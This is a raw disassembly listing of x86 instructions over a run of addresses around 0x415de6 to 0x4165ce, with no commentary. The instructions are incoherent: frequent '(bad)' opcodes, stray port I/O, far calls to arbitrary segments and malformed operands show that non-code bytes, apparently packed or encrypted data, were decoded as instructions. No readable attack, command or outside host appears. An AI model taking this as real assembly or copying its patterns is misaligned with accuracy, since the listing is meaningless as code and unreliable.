  415de6:	mov    esi,0x8badb8a4
  415deb:	not    esi
  415ded:	mov    gs,WORD PTR [eax-0x4402236b]
  415df3:	fdiv   DWORD PTR [eax+0x4e3b349d]
  415df9:	aad    0x98
  415dfb:	inc    edi
  415dfc:	sub    dl,ch
  415dfe:	ds loopne 0x415e79
  415e01:	aaa    
  415e02:	xor    BYTE PTR [edx+edi*8],dh
  415e05:	js     0x415d9b
  415e07:	jecxz  0x415dc8
  415e09:	mov    al,ds:0x2bd0aa6b
  415e0e:	fwait
  415e0f:	mov    esi,DWORD PTR [ebx]
  415e11:	xchg   edx,eax
  415e12:	mov    ?,edi
  415e14:	or     dl,BYTE PTR [ebx-0xd]
  415e17:	adc    edx,DWORD PTR [edx]
  415e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e1a:	and    BYTE PTR [ecx-0x10177951],al
  415e20:	inc    eax
  415e21:	and    eax,0x24f75ba2
  415e26:	xor    BYTE PTR [edx-0x6cf6950a],bh
  415e2c:	jne    0x415e13
  415e2e:	pop    ds
  415e2f:	cdq    
  415e30:	out    0xbc,eax
  415e32:	mov    DWORD PTR ds:0x50b5c75d,edx
  415e38:	inc    esi
  415e39:	shl    DWORD PTR [eax],cl
  415e3b:	mov    cl,BYTE PTR [eax]
  415e3d:	push   cs
  415e3e:	push   esp
  415e3f:	inc    ebx
  415e40:	push   0xd0d279b1
  415e45:	push   esp
  415e46:	(bad)  
  415e47:	stos   DWORD PTR es:[edi],eax
  415e48:	jp     0x415e8e
  415e4a:	(bad)  
  415e4b:	out    dx,eax
  415e4c:	(bad)  
  415e4d:	pop    ebp
  415e4e:	dec    edx
  415e4f:	icebp  
  415e50:	das    
  415e51:	scas   eax,DWORD PTR es:[edi]
  415e52:	jo     0x415e5d
  415e54:	ficom  DWORD PTR [esi+0x849fcba]
  415e5a:	xchg   dh,bh
  415e5c:	aam    0x35
  415e5e:	inc    esp
  415e5f:	xchg   ebx,eax
  415e60:	mov    cl,0x1b
  415e62:	(bad)  
  415e63:	rcl    al,cl
  415e65:	sahf   
  415e66:	outs   dx,DWORD PTR ds:[esi]
  415e67:	inc    edx
  415e68:	dec    ebx
  415e69:	sub    ecx,DWORD PTR [ebp-0x55]
  415e6c:	(bad)  [edi-0x1a]
  415e6f:	xor    cl,BYTE PTR [ecx-0x2270b639]
  415e75:	lahf   
  415e76:	pop    esi
  415e77:	xor    BYTE PTR [ecx-0x58bc7606],0xb9
  415e7e:	sub    BYTE PTR [edx+0x59],cl
  415e81:	mov    eax,0xd0ab0ca
  415e86:	out    dx,eax
  415e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e88:	rcl    BYTE PTR [esi+eiz*8+0x1],cl
  415e8c:	mov    ds:0x7005d0e3,al
  415e91:	int    0x64
  415e93:	lods   eax,DWORD PTR ds:[esi]
  415e95:	retf   0x2b0f
  415e98:	loop   0x415e40
  415e9a:	stos   DWORD PTR es:[edi],eax
  415e9b:	ret    0x62ae
  415e9e:	sub    eax,0xbc628fcd
  415ea3:	fstp   QWORD PTR [ecx-0x4700a5e2]
  415ea9:	mov    bl,0xf2
  415eab:	cmp    al,0xc5
  415ead:	sbb    al,0xb7
  415eaf:	into   
  415eb0:	(bad)  
  415eb1:	fild   QWORD PTR [ebx-0x4538649b]
  415eb7:	jmp    0x15d3:0x7dfe9573
  415ebe:	dec    esp
  415ebf:	addr16 xor eax,0x43557f4a
  415ec5:	(bad)  
  415ec6:	shr    DWORD PTR ds:0x2a6698ef,1
  415ecc:	lds    edx,FWORD PTR [esi+esi*4-0x58]
  415ed0:	jle    0x415ee7
  415ed2:	push   ebx
  415ed3:	dec    edx
  415ed4:	scas   al,BYTE PTR es:[edi]
  415ed5:	test   eax,0xa15b15dd
  415eda:	mov    dh,0x2
  415edc:	cmp    dl,BYTE PTR [ebx-0xe]
  415edf:	shr    edi,1
  415ee1:	pop    esi
  415ee2:	hlt    
  415ee3:	sub    eax,0x7df2c50
  415ee8:	dec    eax
  415ee9:	retf   0xfb9f
  415eec:	jnp    0x415f1a
  415eee:	fs cwde 
  415ef0:	mov    ebp,0x31f59132
  415ef5:	mov    eax,DWORD PTR [ecx]
  415ef7:	xchg   BYTE PTR [eax-0x74ee16ec],dl
  415efd:	fs out 0x86,al
  415f00:	das    
  415f01:	cli    
  415f02:	sub    ebx,DWORD PTR [ebx-0x3d]
  415f05:	xor    DWORD PTR [ecx-0x202efbab],edx
  415f0b:	inc    esp
  415f0c:	ss dec edi
  415f0e:	lods   eax,DWORD PTR ds:[esi]
  415f0f:	jmp    0x415ea2
  415f11:	push   edx
  415f12:	adc    dl,BYTE PTR ds:0x41582be6
  415f18:	fidivr DWORD PTR [ecx]
  415f1a:	aam    0x89
  415f1c:	enter  0xdade,0x9f
  415f20:	inc    eax
  415f21:	(bad)  
  415f22:	xchg   ebp,eax
  415f23:	sbb    edi,0xffffffa9
  415f26:	mov    ecx,0x79a9e7cc
  415f2b:	(bad)  
  415f2c:	imul   ebx,DWORD PTR [edx-0x8eb42af],0x30e98b65
  415f36:	fstp   DWORD PTR [edi-0x5c6ece32]
  415f3c:	(bad)  [esi-0x5e46e050]
  415f42:	in     eax,0x22
  415f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f45:	jl     0x415f65
  415f47:	div    DWORD PTR fs:[ebp-0x8]
  415f4b:	sub    DWORD PTR [ebx+0x5b],ecx
  415f4e:	or     ebx,0xffffffa0
  415f51:	shl    ah,cl
  415f53:	mov    edi,0x62a8696
  415f58:	sub    eax,0xcc8f97c9
  415f5d:	dec    ebp
  415f5e:	fisub  WORD PTR ss:[eax-0x48]
  415f62:	mov    edi,0x4c2717f8
  415f67:	out    dx,al
  415f68:	sub    BYTE PTR [edi],dl
  415f6a:	sbb    al,BYTE PTR [esi+ebx*2+0x4b]
  415f6e:	fmul   DWORD PTR [eax+0x7c]
  415f71:	lock and BYTE PTR [edx],bl
  415f74:	out    0xa1,al
  415f76:	dec    ebx
  415f77:	and    eax,0x81d4c179
  415f7c:	out    dx,al
  415f7d:	push   cs
  415f7e:	loope  0x415f3d
  415f80:	inc    dh
  415f82:	aaa    
  415f83:	push   0xffffffe8
  415f85:	mov    gs,WORD PTR ds:0x4642184b
  415f8b:	jne    0x415f3f
  415f8d:	cli    
  415f8e:	inc    eax
  415f8f:	mov    ds:0x1234c474,al
  415f94:	cmp    cl,BYTE PTR [ecx]
  415f96:	jle    0x415fbd
  415f98:	loope  0x415fca
  415f9a:	in     al,dx
  415f9b:	shl    DWORD PTR [ecx+edi*8+0x3ef2393a],0xca
  415fa3:	jnp    0x415fce
  415fa5:	inc    esi
  415fa6:	aas    
  415fa7:	cli    
  415fa8:	sbb    BYTE PTR [edx-0x65],cl
  415fab:	in     al,0x57
  415fad:	int3   
  415fae:	into   
  415faf:	sub    bl,0x80
  415fb2:	mov    WORD PTR [ebp+edx*2-0x2f],ss
  415fb6:	xor    edi,DWORD PTR [eax]
  415fb8:	(bad)  
  415fb9:	(bad)  
  415fba:	test   edi,esp
  415fbc:	repz dec esi
  415fbe:	jb     0x415f60
  415fc0:	sub    BYTE PTR [ebx],dl
  415fc2:	dec    ebx
  415fc3:	cli    
  415fc4:	jg     0x415f59
  415fc6:	jns    0x415f75
  415fc8:	dec    esp
  415fc9:	int3   
  415fca:	pop    esi
  415fcb:	out    dx,al
  415fcc:	mov    eax,0x4b5b4c3f
  415fd1:	fld    QWORD PTR [ecx+0x953aa5]
  415fd7:	and    esp,DWORD PTR ds:[edx-0x5b]
  415fdb:	inc    eax
  415fdc:	dec    esp
  415fdd:	lock inc ebp
  415fdf:	data16 mov ch,0xe8
  415fe2:	int3   
  415fe3:	ds dec ebp
  415fe5:	(bad)  
  415fe6:	ins    BYTE PTR es:[edi],dx
  415fe7:	add    al,0x6
  415fe9:	cmp    cl,al
  415feb:	aas    
  415fec:	jg     0x41605f
  415fee:	stos   DWORD PTR es:[edi],eax
  415fef:	mov    eax,ds:0x1fda0a86
  415ff4:	xchg   ebx,eax
  415ff5:	je     0x415fc3
  415ff7:	mov    esp,0x4759dfc
  415ffc:	or     DWORD PTR [ebp+0x1cc8b490],ebx
  416002:	(bad)  [ecx-0x3899e5a7]
  416008:	pushw  ds
  41600a:	mov    cs,WORD PTR [ebp+0x33]
  41600d:	rcr    DWORD PTR [edi+edx*8+0x27],0xb0
  416012:	mov    ah,0x48
  416014:	pop    edx
  416015:	mul    BYTE PTR [eax-0x11a9c406]
  41601b:	xor    eax,eax
  41601d:	pop    esp
  41601e:	mov    esi,DWORD PTR [edi+edi*4-0x578305e8]
  416025:	push   edi
  416026:	push   cs
  416027:	fucomp st(1)
  416029:	int    0x9e
  41602b:	cmp    WORD PTR [edx],sp
  41602e:	sub    bl,BYTE PTR [ebp+0x24b8718]
  416034:	add    ch,0x50
  416037:	xor    BYTE PTR [ebp+0x4d50bb54],0x73
  41603e:	xchg   esp,eax
  41603f:	mov    ebp,0xf9afadbf
  416044:	out    dx,eax
  416045:	aas    
  416046:	mov    ebp,0xab4edd94
  41604b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41604c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41604d:	js     0x416080
  41604f:	icebp  
  416050:	jle    0x416012
  416052:	retf   0xfdc8
  416055:	int    0x29
  416057:	fisttp QWORD PTR [ecx-0x5487fc65]
  41605d:	lods   al,BYTE PTR ds:[esi]
  41605e:	dec    ebp
  41605f:	push   ecx
  416060:	call   0x2a03:0xd58a62b
  416067:	lock or al,0x2e
  41606a:	ss pop ss
  41606c:	jle    0x416092
  41606e:	push   edx
  41606f:	sub    al,0x2d
  416071:	or     ecx,DWORD PTR [ecx-0x59]
  416074:	(bad)  
  416075:	jge    0x41607d
  416077:	test   DWORD PTR [eax],ebx
  416079:	scas   eax,DWORD PTR es:[edi]
  41607a:	jo     0x4160d9
  41607c:	fwait
  41607d:	push   es
  41607e:	fbstp  TBYTE PTR [esp+ecx*2+0x1c9a44d4]
  416085:	jg     0x416064
  416087:	popa   
  416088:	outs   dx,DWORD PTR ds:[esi]
  416089:	pushf  
  41608a:	(bad)  
  41608b:	ss mov ebp,0x726bf8ae
  416091:	scas   al,BYTE PTR es:[edi]
  416092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416093:	push   eax
  416094:	adc    ch,dh
  416096:	mov    ecx,0x86416089
  41609b:	je     0x4160f3
  41609d:	push   ds
  41609e:	sbb    al,BYTE PTR [esi]
  4160a0:	test   DWORD PTR ds:0x81f52f30,ebp
  4160a6:	mov    ebx,DWORD PTR [edi+edx*2+0x50460dde]
  4160ad:	sub    bl,BYTE PTR ds:0x844674c1
  4160b3:	xchg   edx,eax
  4160b4:	loope  0x416114
  4160b6:	aas    
  4160b7:	jl     0x4160ea
  4160b9:	mov    edi,0x21121258
  4160be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160bf:	movlhps xmm6,xmm6
  4160c2:	nop
  4160c3:	fucompp 
  4160c5:	(bad)
  4160c8:	dec    edi
  4160c9:	or     al,0xed
  4160cb:	rcl    BYTE PTR [edi],0x17
  4160ce:	cdq    
  4160cf:	inc    esi
  4160d0:	bound  ecx,QWORD PTR [eax-0x47]
  4160d3:	push   edx
  4160d4:	mov    ss,edi
  4160d6:	xor    al,BYTE PTR [ebp+0x5e357a5e]
  4160dc:	jle    0x41614c
  4160de:	cmp    edi,DWORD PTR [edi]
  4160e0:	hlt    
  4160e1:	fnstenv [esi-0x72]
  4160e4:	mov    bl,0x48
  4160e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e7:	mov    eax,0x7ee473f2
  4160ec:	jns    0x41607f
  4160ee:	clc    
  4160ef:	shr    DWORD PTR ds:0x10d191c9,cl
  4160f5:	and    BYTE PTR [eax-0x4b],ah
  4160f8:	mov    dh,0x17
  4160fa:	dec    esi
  4160fb:	push   fs
  4160fd:	jns    0x416139
  4160ff:	(bad)  
  416100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416101:	dec    ebx
  416102:	jb     0x416151
  416104:	shr    DWORD PTR [eax],cl
  416106:	and    ebx,DWORD PTR [edx]
  416108:	hlt    
  416109:	lds    edx,FWORD PTR [esi]
  41610b:	mov    al,ds:0x35694f70
  416110:	fisttp QWORD PTR [ecx-0x389c80a9]
  416116:	ret    
  416117:	inc    ecx
  416118:	xchg   DWORD PTR [ebx+0x60],esi
  41611b:	add    ecx,edi
  41611d:	outs   dx,BYTE PTR ds:[esi]
  41611e:	sub    eax,ebp
  416120:	fwait
  416121:	push   esi
  416122:	add    al,BYTE PTR [esi]
  416124:	dec    eax
  416125:	xchg   DWORD PTR [ebx+0x6a63be74],eax
  41612b:	fs dec esp
  41612d:	fbstp  TBYTE PTR [edi-0x16a039c3]
  416133:	push   ebx
  416134:	mov    bl,0xd1
  416136:	hlt    
  416137:	das    
  416138:	jge    0x4161b8
  41613a:	mov    ?,edx
  41613c:	sub    BYTE PTR [edi-0x1b],al
  41613f:	cs dec ebx
  416141:	inc    ecx
  416142:	mov    DWORD PTR [ecx],edx
  416144:	imul   DWORD PTR [edx-0x7f]
  416147:	scas   eax,DWORD PTR es:[edi]
  416148:	jmp    0x416122
  41614a:	dec    esp
  41614b:	ror    DWORD PTR [edi],0x89
  41614e:	(bad)  
  41614f:	(bad)  
  416150:	loope  0x416152
  416152:	repnz sti 
  416154:	or     al,BYTE PTR [ecx]
  416156:	xchg   DWORD PTR [ebx-0x68dc52a6],edi
  41615c:	jae    0x41616c
  41615e:	adc    al,0xb4
  416160:	aad    0xa8
  416162:	pop    ebx
  416163:	sti    
  416164:	aam    0x27
  416166:	xchg   esi,eax
  416167:	ret    0xaf74
  41616a:	cmp    dh,BYTE PTR [edi]
  41616c:	sub    ah,BYTE PTR [eax+esi*1+0x4b792da1]
  416173:	pop    eax
  416174:	xor    eax,0x6671c5d2
  416179:	xchg   ebx,eax
  41617a:	add    esi,DWORD PTR [eax+0x4d7e2599]
  416180:	ret    0xbf66
  416183:	inc    ebp
  416184:	es cld 
  416186:	dec    edx
  416187:	adc    eax,0xb9261627
  41618c:	push   es
  41618d:	push   DWORD PTR [edi+0x6688e7a6]
  416193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416194:	pop    es
  416195:	sub    esp,edi
  416197:	lods   al,BYTE PTR ds:[esi]
  416198:	jg     0x416201
  41619a:	add    ebx,DWORD PTR [esi-0x556883da]
  4161a0:	icebp  
  4161a1:	inc    edx
  4161a2:	popw   ds
  4161a4:	pop    ds
  4161a5:	das    
  4161a6:	sbb    BYTE PTR [ecx-0x42df2c4f],cl
  4161ac:	push   esi
  4161ad:	mov    dl,ah
  4161af:	pop    edi
  4161b0:	and    al,0x8b
  4161b2:	sbb    eax,DWORD PTR [edi+edx*8]
  4161b5:	xor    ch,BYTE PTR [ebp-0x61]
  4161b8:	(bad)  
  4161b9:	fnsave [ebp-0x39]
  4161bc:	popa   
  4161bd:	sti    
  4161be:	rcr    esi,0xc6
  4161c1:	mov    esi,0x1361c8a4
  4161c6:	pop    ecx
  4161c7:	retf   
  4161c8:	xor    bl,BYTE PTR [esi+esi*4+0x48b09732]
  4161cf:	lods   al,BYTE PTR ds:[esi]
  4161d0:	sbb    BYTE PTR [ecx],cl
  4161d2:	xor    al,0xcb
  4161d4:	cli    
  4161d5:	jb     0x416240
  4161d7:	ja     0x4161a4
  4161d9:	in     eax,dx
  4161da:	retf   
  4161db:	push   ss
  4161dc:	les    ebx,FWORD PTR [ebx+0x6f1a4ebc]
  4161e2:	xor    eax,0x545bc96b
  4161e7:	imul   edx,DWORD PTR [esp+ebx*8],0xffffffac
  4161eb:	sbb    DWORD PTR [ebx+0x6ad347a8],ebx
  4161f1:	les    ecx,FWORD PTR [eax-0x5612821f]
  4161f7:	cld    
  4161f8:	xor    ecx,DWORD PTR gs:[esi+0x41]
  4161fc:	jg     0x4161f2
  4161fe:	scas   eax,DWORD PTR es:[edi]
  4161ff:	mov    edx,0xe990761e
  416204:	sbb    eax,0x38dbda85
  416209:	(bad)  
  41620b:	das    
  41620c:	pop    ds
  41620d:	stos   BYTE PTR es:[edi],al
  41620e:	adc    eax,0x83fc0c6a
  416213:	ja     0x416241
  416215:	dec    ebp
  416216:	addr16 mov edi,0xf236d1a1
  41621c:	fyl2x  
  41621e:	(bad)  
  416220:	push   esp
  416221:	sub    DWORD PTR [eax-0x23],ecx
  416224:	mov    cl,0x6b
  416226:	arpl   ax,bx
  416228:	mov    ebx,0x979b4f67
  41622d:	out    dx,eax
  41622e:	fld    DWORD PTR [edi-0x25e2d014]
  416234:	aam    0x8f
  416236:	adc    ebx,eax
  416238:	repz or eax,DWORD PTR ds:0xfbf0ce12
  41623f:	sub    bh,dh
  416241:	call   0x9ef067d
  416246:	xor    bh,BYTE PTR [edi]
  416248:	imul   BYTE PTR ss:[ebx-0x7a920ad]
  41624f:	jbe    0x4161e3
  416251:	sbb    ch,BYTE PTR [eax]
  416253:	add    eax,0x6bd557bc
  416259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41625a:	jle    0x416216
  41625c:	adc    DWORD PTR ds:0xf1e3cb1e,esp
  416262:	dec    edx
  416263:	hlt    
  416264:	stos   DWORD PTR es:[edi],eax
  416265:	(bad)  
  416266:	lock aaa 
  416268:	pop    edi
  416269:	popf   
  41626a:	xchg   ebx,eax
  41626b:	mov    edi,0xab0dbb1c
  416270:	fld    QWORD PTR [edx-0x3d]
  416273:	imul   edx,edx,0xffffff8d
  416276:	enter  0xd734,0xcf
  41627a:	cmp    al,0xd1
  41627c:	adc    eax,0x5c13c8cd
  416281:	data16 in al,dx
  416283:	xchg   DWORD PTR [eax],ecx
  416285:	sar    DWORD PTR [esi],0x22
  416288:	dec    edi
  416289:	mov    esp,0xff28e613
  41628e:	cmp    al,0x58
  416290:	pop    edi
  416291:	out    dx,al
  416292:	or     ebx,DWORD PTR [ebx+0x16adeae5]
  416298:	popa   
  416299:	push   ecx
  41629a:	(bad)  
  41629b:	xor    eax,DWORD PTR [edi]
  41629d:	add    DWORD PTR [edi],0x95e021b
  4162a3:	pop    ebx
  4162a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a5:	mov    al,ds:0xe6102190
  4162aa:	out    dx,al
  4162ab:	repz imul ecx,DWORD PTR [ecx+esi*4-0x5],0x576fe48b
  4162b4:	scas   eax,DWORD PTR es:[edi]
  4162b5:	pushf  
  4162b6:	lahf   
  4162b7:	push   edi
  4162b8:	pop    eax
  4162b9:	mov    ch,dl
  4162bb:	out    dx,al
  4162bc:	and    bl,al
  4162be:	push   ebp
  4162bf:	out    dx,al
  4162c0:	out    dx,eax
  4162c1:	retf   
  4162c2:	cwde   
  4162c3:	mov    ebx,0x2ec8c507
  4162c8:	ss push ss
  4162ca:	sbb    bl,BYTE PTR [ebx+0x7f841736]
  4162d0:	mov    ah,0xf0
  4162d2:	push   es
  4162d3:	dec    edi
  4162d4:	mov    esp,0x63b394d3
  4162d9:	call   0x325fddb3
  4162de:	ficomp WORD PTR [ebx+0x11894c71]
  4162e4:	enter  0x87ce,0xc9
  4162e8:	sbb    al,0x60
  4162ea:	jne    0x4162ea
  4162ec:	sbb    esi,DWORD PTR [edi-0x75463dcb]
  4162f2:	push   edx
  4162f3:	(bad)  
  4162f4:	pop    ds
  4162f5:	jbe    0x416285
  4162f7:	and    edi,DWORD PTR [ebp+0x53]
  4162fa:	cmp    eax,0xd7ac5338
  4162ff:	aas    
  416300:	sub    bh,BYTE PTR [ebx]
  416302:	xlat   BYTE PTR ds:[ebx]
  416303:	push   es
  416304:	jns    0x416342
  416306:	jb     0x4162af
  416308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416309:	fidivr WORD PTR [eax]
  41630b:	push   ebx
  41630c:	adc    esp,0xcd6bd80a
  416312:	loop   0x416328
  416314:	jecxz  0x41635a
  416316:	les    ebp,FWORD PTR [eax]
  416318:	les    edx,FWORD PTR [edx+edx*8]
  41631b:	cs fwait
  41631d:	daa    
  41631e:	push   0xfffffff6
  416320:	sub    esp,DWORD PTR [ebx]
  416322:	out    0x8b,al
  416324:	fisttp DWORD PTR [ebp-0x5569c717]
  41632a:	adc    eax,0xfdc74f9d
  41632f:	push   ebp
  416330:	daa    
  416331:	inc    edi
  416332:	push   es
  416333:	jecxz  0x4162b5
  416335:	std    
  416336:	mov    al,0x32
  416338:	cs push eax
  41633a:	mov    esp,0x6d0aa522
  41633f:	sbb    BYTE PTR [edx+edi*4],bh
  416342:	pusha  
  416343:	mov    WORD PTR [esi],ss
  416345:	mov    WORD PTR [edi+0x9],ds
  416348:	and    eax,DWORD PTR [esi+0x7c]
  41634b:	les    ecx,FWORD PTR [eax]
  41634d:	adc    BYTE PTR [eax-0x6d749acf],0x1a
  416354:	push   ds
  416355:	pop    ebp
  416356:	imul   edi,DWORD PTR [esi],0x8a1ade2a
  41635c:	in     al,0xe6
  41635e:	sbb    ah,cl
  416360:	outs   dx,DWORD PTR ds:[esi]
  416361:	ja     0x4163be
  416363:	daa    
  416364:	shl    DWORD PTR [esi+0x69e416ab],0xb0
  41636b:	into   
  41636c:	out    0x5e,eax
  41636e:	mov    al,ds:0xf96559f3
  416373:	stc    
  416374:	fistp  QWORD PTR [edi-0x16]
  416377:	inc    ecx
  416378:	mov    ebx,0x3fbe0b51
  41637d:	ds pop ebp
  41637f:	fsubr  QWORD PTR [ebx]
  416381:	test   edx,edi
  416383:	mov    ebx,0x1312d9b6
  416388:	fiadd  DWORD PTR [ecx-0x56]
  41638b:	aad    0x7b
  41638d:	dec    esp
  41638e:	inc    esi
  41638f:	add    eax,0xc953295f
  416394:	add    bh,BYTE PTR [esi-0xe9b23a]
  41639a:	aam    0xc
  41639c:	fdiv   DWORD PTR fs:[ecx-0x74]
  4163a0:	push   ecx
  4163a1:	test   BYTE PTR [ebx+0x23],dh
  4163a4:	adc    al,0x60
  4163a6:	inc    esi
  4163a7:	mov    al,0x3a
  4163a9:	or     BYTE PTR [edx-0x3928874],al
  4163af:	mov    ss,WORD PTR [eax]
  4163b1:	shl    BYTE PTR [ebx-0x30],cl
  4163b4:	(bad)  
  4163b5:	push   cs
  4163b6:	xchg   DWORD PTR [edi+0x247fffbb],ebp
  4163bc:	das    
  4163bd:	sub    BYTE PTR [ebx-0x354bf575],ch
  4163c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c4:	mov    es,WORD PTR [eax+0x3854ad88]
  4163ca:	(bad)  
  4163cb:	and    esi,DWORD PTR [edx-0x52a8b34e]
  4163d1:	iret   
  4163d2:	iret   
  4163d3:	mov    ebp,0xa5cf641a
  4163d8:	xchg   DWORD PTR [esp+eax*4-0x7776af9a],esi
  4163df:	test   eax,0x18449548
  4163e4:	push   ds
  4163e5:	out    0xff,al
  4163e7:	inc    edi
  4163e8:	mov    ecx,0xd349ac16
  4163ed:	jnp    0x4163e7
  4163ef:	mov    ds:0xe9a9fddc,eax
  4163f4:	das    
  4163f5:	out    0xcc,al
  4163f7:	(bad)  
  4163f8:	sti    
  4163f9:	jl     0x41646e
  4163fb:	in     eax,dx
  4163fc:	pop    edx
  4163fd:	mov    esi,0x3cceb455
  416402:	fild   DWORD PTR [esi]
  416404:	lds    esp,FWORD PTR [edx-0x402afb69]
  41640a:	scas   al,BYTE PTR es:[edi]
  41640b:	fadd   QWORD PTR [edx+0x85329d0]
  416411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416412:	push   0x4e9c901b
  416417:	add    eax,0x1d1052ed
  41641c:	fsub   DWORD PTR [edx+eax*2-0x439cff9e]
  416423:	arpl   WORD PTR [bx-0x3582],si
  416428:	scas   eax,DWORD PTR es:[edi]
  416429:	add    ch,BYTE PTR [ebp+0x1a]
  41642c:	xor    BYTE PTR [esi+0x19],ah
  41642f:	cld    
  416430:	fwait
  416431:	mov    ecx,0x77e9cdec
  416436:	cli    
  416437:	test   DWORD PTR ds:0x1c71ac73,ebp
  41643d:	pushf  
  41643e:	mov    bh,bh
  416440:	cwde   
  416441:	std    
  416442:	inc    eax
  416443:	xchg   esp,eax
  416444:	jp     0x4164a0
  416446:	mov    edx,0x8526575
  41644b:	mov    eax,0x2ce6a00f
  416450:	outs   dx,DWORD PTR ds:[esi]
  416451:	mov    BYTE PTR [edx],dl
  416453:	aam    0x38
  416455:	cmp    ebx,esp
  416457:	stos   BYTE PTR es:[edi],al
  416458:	(bad)
  41645c:	xchg   edi,eax
  41645d:	shl    DWORD PTR [edi-0x3d96e34],0x72
  416464:	daa    
  416465:	gs fwait
  416467:	add    bh,BYTE PTR [eax+0x77]
  41646a:	pop    ebp
  41646b:	xchg   ebp,ecx
  41646d:	out    dx,al
  41646e:	fucomip st,st(7)
  416470:	xor    edx,esp
  416472:	dec    edx
  416473:	lea    edx,[ecx-0x4ab5ce0f]
  416479:	mov    dh,0x54
  41647b:	pop    DWORD PTR [edx]
  41647d:	(bad)  
  41647e:	push   ebp
  41647f:	stc    
  416480:	xchg   DWORD PTR [eax],eax
  416482:	sbb    BYTE PTR [ebp-0x3cce3f35],ch
  416488:	jbe    0x416448
  41648a:	or     al,0xfd
  41648c:	outs   dx,DWORD PTR ds:[esi]
  41648d:	test   eax,0xb3483313
  416492:	push   edi
  416493:	mov    bl,0x50
  416495:	ds pop ss
  416497:	adc    bh,BYTE PTR [ebp+0x5193802c]
  41649d:	mov    cl,0x1f
  41649f:	pop    ds
  4164a0:	fisub  DWORD PTR [edi+esi*8-0x4a]
  4164a4:	hlt    
  4164a5:	adc    ch,ah
  4164a7:	(bad)  
  4164a8:	sub    bh,BYTE PTR [ecx+0x6063849]
  4164ae:	pop    DWORD PTR ds:0xa0d33252
  4164b4:	ret    0x1ebb
  4164b7:	or     ebp,DWORD PTR [esi]
  4164b9:	or     esi,esp
  4164bb:	popa   
  4164bc:	leave  
  4164bd:	(bad)  
  4164bf:	sub    edx,DWORD PTR [edx-0x5c11ecdf]
  4164c5:	lods   eax,DWORD PTR ds:[esi]
  4164c6:	in     al,0x28
  4164c8:	loopne 0x4164bd
  4164ca:	mov    dh,0x62
  4164cc:	jge    0x4164fc
  4164ce:	call   0x972c:0x3af1ada1
  4164d5:	jo     0x416475
  4164d7:	ror    BYTE PTR [edi+0x627d8d0],0x4a
  4164de:	dec    eax
  4164df:	rcl    DWORD PTR ds:0xebe031c2,0xa5
  4164e6:	dec    esi
  4164e7:	ja     0x416526
  4164e9:	aad    0xfb
  4164eb:	pop    esp
  4164ec:	ins    BYTE PTR es:[edi],dx
  4164ed:	jae    0x4164bd
  4164ef:	xchg   bl,ch
  4164f1:	neg    DWORD PTR [edx-0x6260ff85]
  4164f7:	mov    ds:0x18248f43,eax
  4164fc:	dec    ebx
  4164fd:	aas    
  4164fe:	jo     0x4164b5
  416500:	div    BYTE PTR [ebx]
  416502:	std    
  416503:	fist   WORD PTR [edi+0x65]
  416506:	lods   al,BYTE PTR ds:[esi]
  416507:	mov    ds:0x265536d7,eax
  41650d:	lock and edx,DWORD PTR [eax]
  416510:	xor    eax,0x22b7a9f2
  416515:	call   0x6ecb:0xd2f477ff
  41651c:	repnz xor al,0xde
  41651f:	add    BYTE PTR [eax+0x2b10de3e],0x4b
  416526:	sub    esi,0xffffff9d
  416529:	out    dx,al
  41652a:	data16 and BYTE PTR [ebx-0x57129a54],ah
  416531:	or     BYTE PTR [ecx+0x32],dl
  416534:	aaa    
  416535:	les    edi,FWORD PTR [ecx-0x13]
  416538:	in     eax,dx
  416539:	push   cs
  41653a:	lods   al,BYTE PTR ds:[esi]
  41653b:	outs   dx,BYTE PTR ds:[esi]
  41653c:	mov    ebx,0xd2983381
  416541:	cld    
  416542:	in     eax,dx
  416543:	bound  esp,QWORD PTR [esp+ecx*8+0x10]
  416547:	sbb    eax,0xceed8005
  41654c:	sub    esi,edi
  41654e:	jns    0x41654f
  416550:	push   0x6a
  416552:	mov    esp,0x847faaaf
  416557:	and    bh,BYTE PTR [ecx+0x6]
  41655a:	or     edi,esp
  41655c:	xor    ch,dl
  41655e:	pusha  
  41655f:	mov    ebp,0xa9b37ce9
  416564:	ja     0x41658e
  416566:	pop    esp
  416567:	hlt    
  416568:	cmp    bl,cl
  41656a:	and    DWORD PTR [esi+eax*4-0xc],ecx
  41656e:	call   0x7e24:0x11241317
  416575:	sub    ecx,0x53b0c05a
  41657b:	ficomp DWORD PTR [ecx+eax*2-0xef67345]
  416582:	jge    0x416580
  416584:	pop    ss
  416585:	js     0x4165be
  416587:	mov    esi,0x6a2062b8
  41658c:	push   ecx
  41658d:	xor    edi,ecx
  41658f:	pop    ebx
  416590:	pusha  
  416591:	fucom  st(4)
  416593:	pop    ds
  416594:	mov    eax,0x3c229cca
  416599:	or     DWORD PTR [edi-0x597ab00],eax
  41659f:	imul   edi,DWORD PTR [esp+ebp*8-0x2f],0xffffff80
  4165a4:	add    bh,BYTE PTR [edi+0x18]
  4165a7:	mov    cl,0x0
  4165a9:	(bad)  
  4165aa:	cmc    
  4165ab:	jl     0x4165b6
  4165ad:	aad    0x42
  4165af:	arpl   WORD PTR [edx+ebx*1+0x23],sp
  4165b3:	aas    
  4165b4:	in     eax,0x1
  4165b6:	ds jg  0x41657b
  4165b9:	fisttp DWORD PTR [eax]
  4165bb:	dec    ebp
  4165bc:	pop    edi
  4165bd:	pop    ss
  4165be:	retf   0xaa59
  4165c1:	adc    BYTE PTR [edx-0x35],dl
  4165c4:	xor    al,0xb6
  4165c6:	mov    eax,0xffb156e4
  4165cb:	cwde   
  4165cc:	stos   DWORD PTR es:[edi],eax
  4165cd:	(bad)  
  4165ce:	shl    eax,cl
